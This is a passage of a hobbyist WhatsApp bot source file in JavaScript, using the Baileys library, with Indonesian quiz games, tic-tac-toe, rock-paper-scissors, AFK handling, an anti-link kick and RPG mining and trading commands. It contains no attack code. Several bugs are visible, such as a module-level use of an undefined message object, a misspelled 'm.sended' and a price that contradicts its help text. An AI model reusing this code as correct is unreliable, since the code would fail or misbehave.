/**
   * Create By Dika Ardnt.
   * Contact Me on wa.me/6288292024190
   * Follow https://github.com/DikaArdnt
*/

require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')

//function rpg
   const { 
     addInventoriDarah, 
      cekDuluJoinAdaApaKagaDiJson, 
      addDarah, 
      kurangDarah, 
     getDarah 
   }  = require('./storage/user/darah.js')
   const { 
     cekInventoryAdaAtauGak, 
      addInventori,  
       addBesi, 
       addEmas, 
       addEmerald,
       addUmpan,
       addPotion,
       kurangBesi, 
       kurangEmas, 
       kurangEmerald, 
       kurangUmpan,
       kurangPotion,
       getBesi, 
      getEmas, 
     getEmerald,
     getUmpan,
    getPotion
   } = require('./storage/user/alat_tukar.js')
   const { 
    addInventoriMonay, 
    cekDuluJoinAdaApaKagaMonaynyaDiJson, 
    addMonay, 
    kurangMonay, 
   getMonay 
   } = require('./storage/user/monay.js')
   const { 
    addInventoriLimit, 
    cekDuluJoinAdaApaKagaLimitnyaDiJson, 
    addLimit, 
    kurangLimit, 
    getLimit 
   } = require('./storage/user/limit.js')
   const { 
    cekDuluHasilBuruanNya, 
     addInventoriBuruan, 
     addIkan,
      addAyam, 
      addKelinci, 
      addDomba, 
      addSapi,
      addGajah,
      kurangIkan,
      kurangAyam, 
      kurangKelinci, 
      kurangDomba, 
      kurangSapi,
      kurangGajah,
      getIkan,
      getAyam, 
      getKelinci, 
      getDomba,
     getSapi,
    getGajah
   } = require('./storage/user/buruan.js')
   let DarahAwal =  global.rpg.darahawal
   const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)   
   const isCekDarah = getDarah(m.sender)
   const isUmpan = getUmpan(m.sender)
   const isPotion = getPotion(m.sender)
   const isIkan = getIkan(m.sender)
   const isAyam = getAyam(m.sender)
   const isKelinci = getKelinci(m.sender)
   const isDomba = getDomba(m.sender)
   const isSapi = getSapi(m.sender)
   const isGajah = getGajah(m.sender)
   const isMonay = getMonay(m.sender)
   const isLimit = getLimit(m.sender)
   const isBesi = getBesi(m.sender)
   const isEmas = getEmas(m.sender)
   const isEmerald = getEmerald(m.sender)
   const isInventory = cekInventoryAdaAtauGak(m.sender)
   const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
   const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
   const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
   const ikan = ['🐟','🐠','🐡']   

// Database Rpg
 let _limit = JSON.parse(fs.readFileSync('./storage/user/limit.json'));
 let _buruan = JSON.parse(fs.readFileSync('./storage/user/hasil_buruan.json'));
 let _darahOrg = JSON.parse(fs.readFileSync('./storage/user/darah.json'))

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

// Language
const  { ind } = require(`./language`)
lang = ind // Language

module.exports = chika = async (chika, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await chika.decodeJid(chika.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)
	    const from = mek.key.remoteJid

        // Group
        const groupMetadata = m.isGroup ? await chika.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	    
        // Memeg
        let picaks = [flaming,fluming,flarun,flasmurf]
		let picak = picaks[Math.floor(Math.random() * picaks.length)]
		
          try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!chika.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            chika.sendReadReceipt(m.chat, m.sender, [m.key.id])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await chika.setStatus(`${chika.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await chika.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        chika.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: chika.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, chika.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        chika.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            chika.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await chika.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, chika.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await chika.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, chika.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await chika.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, chika.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await chika.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, chika.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await chika.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, chika.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await chika.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, chika.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await chika.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, chika.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await chika.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await chika.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    chika.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    chika.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) chika.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) chika.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) chika.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    chika.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) chika.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) chika.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    chika.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
	    
        switch(command) {
        case 'inventori': case 'profile':{
if (q.includes('--help')) return m.reply(examkosong) 
  if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
  if (!isInventory){ addInventori(m.sender) }
  if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
     
     var riych = await getBuffer(picak+'Profile User')
     let teksehmazeh = `_[ 👩🏻‍💼INFO USER👨🏻‍💼 ]_\n\n`
     teksehmazeh += `*❤️Darah kamu* : ${getDarah(m.sender)}\n`
     teksehmazeh += `*◻️️Besi kamu* : ${getBesi(m.sender)}\n`
     teksehmazeh += `*🌟Emas Kamu* : ${getEmas(m.sender)}\n`
     teksehmazeh += `*💎Emerald Kamu* : ${getEmerald(m.sender)}\n`
     teksehmazeh += `*⏺️Limit kamu* : ${getLimit(m.sender)}\n`
     teksehmazeh += `*🧪Potion Kamu* : ${getPotion(m.sender)}\n\n`
     teksehmazeh += `_[ 🐺HASIL BURUAN🐺 ]_\n`
     teksehmazeh += `*🐟Ikan* : ${getIkan(m.sender)}\n`
     teksehmazeh += `*🐔Ayam* : ${getAyam(m.sender)}\n`
     teksehmazeh += `*🐇Kelinci* : ${getKelinci(m.sender)}\n`
     teksehmazeh += `*🐑Domba* : ${getDomba(m.sender)}\n`
     teksehmazeh += `*🐄Sapi* : ${getSapi(m.sender)}\n`
     teksehmazeh += `*🐘Gajah* : ${getGajah(m.sender)}\n\n`
     teksehmazeh += `_*${pushname}*_`
     await chika.send5ButImg(from, `` + '' + teksehmazeh, `© ${footer}`, riych, [{"urlButton": {"displayText": "Subscribe","url": `${sc}`}}])
  }
  break
        case 'limituser':
{      
   let txt = `「 *ALL LIMIT USER* 」\n\n`
     for (let i of _limit){
     txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Limit* : ${i.limit}\n`
     }
    m.reply(txt)       
  }
 break
 case 'leaderboard':
{      
   let txt = `「 *LEADERBOARD* 」\n\n`
     for (let i of _buruan){
     txt += `➸ *ID :* ${i.id}\n`
     txt += `*🐟Ikan* : ${i.ikan}\n`
     txt += `*🐔Ayam* : ${i.ayam}\n`
     txt += `*🐇Kelinci* : ${i.kelinci}\n`
     txt += `*🐑Domba* : ${i.domba}\n`
     txt += `*🐄Sapi* : ${i.sapi}\n`
     txt += `*🐘Gajah* : ${i.gajah}\n\n`
     }
    m.reply(txt)       
  }
 break
case 'mining': case 'menambang':{
if (q.includes('--help')) return m.reply(examkosong) 
  if (!isInventory){ addInventori(m.sender) }
  if (isCekDarah < 1) return m.reply('Kamu kelelahan!, cobalah heal menggunakan potion') 
  let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
  let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
  let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
  var besinya = besi[Math.floor(Math.random() * besi.length)]  
  var emasnya = emas[Math.floor(Math.random() * emas.length)]  
  var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]  
  setTimeout( () => {
  let caption = `[ HASIL MENAMBANG ]\n*Besi* : ${besinya}\n*Emas* : ${emasnya}\n*Emerald* : ${emeraldnya}`
  let buttons = [
      {
       buttonId: `${prefix + command}`, 
       buttonText: {
        displayText: 'Menambang lagi⛏️'
      }, type: 1},
    ]
    let buttonMessage = {
      image: { url: './storage/image/tambang.jpg' },
      caption: caption,
      footer: pushname,
      buttons: buttons,
      headerType: 4
     }
     chika.sendMessage(from, buttonMessage, { quoted: m })
   
   }, 7000)  
  setTimeout( () => {
  m.reply(`@${m.sender.split("@")[0]} Mulai menambang🎣`)     
  }, 1500)
  kurangDarah(m.sender, 10)
  addBesi(m.sender, besinya)
  addEmas(m.sended, emasnya)
  addEmerald(m.sender, emeraldnya)	     
  }   
  break  
  //transaksi
 case 'beli': case 'buy':{
if (q.includes('--help')) return m.reply(examkosong) 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return m.reply('Mau beli apa?')
 var anu = args[1]
  if (args[0] === 'potion'){
  let noh = 100000 * anu
 if (!args[1]) return m.reply(`Example : ${prefix + command} potion 2\n 1 potion = 100000 monay`)
 if (isMonay < noh) return m.reply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(m.sender)}\n*Potion kamu* : ${getPotion(m.sender)}`)
  }, 2000) 
 } else 
 if (args[0] === 'umpan'){
  let noh = 5000 * anu
 if (!args[1]) return m.reply(`Example : ${prefix + command} umpan 2\n 1 umpan = 2500 monay`)
 if (isMonay < noh) return m.reply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(m.sender)}\n*Umpan kamu* : ${getUmpan(m.sender)}`)
  }, 2000) 
  } else 
  if (args[0] === 'limit'){
  let noh = 35000 * anu
 if (!args[1]) return m.reply(`Example : ${prefix + command} limit 2\n 1 limit = 35000 monay`)
 if (isMonay < noh) return m.reply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(m.sender)}\n*Limit kamu* : ${getLimit(m.sender)}`)
  }, 2000) 
  } else { m.reply("Format salah!") }
 }
 break
 case 'sel': case 'jual':{//BY LORD RIFZA
 if (!q) return  m.reply(`Mau jual apa?\nExample : ${prefix + command} ikan 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'ikan'){
 if (isIkan < anu) return m.reply('Ikan kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} ikan 2\n 1 ikan = 1500 monay`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Ikan kamu* : ${getIkan(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'ayam'){
 if (isAyam < anu) return m.reply('Ayam kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} ayam 2\n 1 ayam = 2500 monay`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Ayam kamu* : ${getAyam(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'kelinci'){
 if (isKelinci < anu) return m.reply('Kelinci kamu tidak mencukupi untuk transaksi ini')
